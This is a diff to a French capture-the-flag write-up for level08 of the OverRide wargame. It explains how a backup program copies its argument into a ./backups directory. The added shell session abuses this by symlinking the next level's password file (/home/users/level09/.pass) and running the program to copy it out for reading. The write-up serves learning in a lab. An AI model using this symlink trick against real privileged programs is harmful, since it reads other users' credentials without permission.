@@ -10,13 +10,13 @@ level08@OverRide:~$ ./level08 test
 ERROR: Failed to open test
 ```
 
-
-Quand on regarde le code decompile, on se rend compte qu'il tente d'ouvrir le fichier a cet endroit:
+Ca se confirme avec le code decompile.
 ```c
 FILE* fp = fopen(argv[1], "r");
 ```
 
-dans le code decompile on voit qu'il cherche a avoir acces a un dossier `backups`:
+Dans le code decompile on voit qu'il cherche a avoir acces a un dossier `backups`.
+C'est dans ce repertoire que notre programme va tenter d'ecrire une copie du fichier donne en argument.
 
 ```c
     FILE* fd = fopen("./backups/.log", "w");
@@ -44,4 +44,14 @@ ce dossier est present dans le repertoire.
 dans ce repertoire, on a pas les droits pour creer des fichiers, et c'est pour ca que le programme renvoie une erreur
 donc on va chercher a reproduire cette architecture de dossier dans un repertoire ou on a des droits
 
-
+```bash
+evel08@OverRide:~$ chmod +w ~
+level08@OverRide:~$ ln -s /home/users/level09/.pass password
+level08@OverRide:~$ ls
+backups  level08  password
+level08@OverRide:~$ ./level08 password
+level08@OverRide:~$ cd backups/
+level08@OverRide:~/backups$ ls
+password
+level08@OverRide:~/backups$ cat password
+```
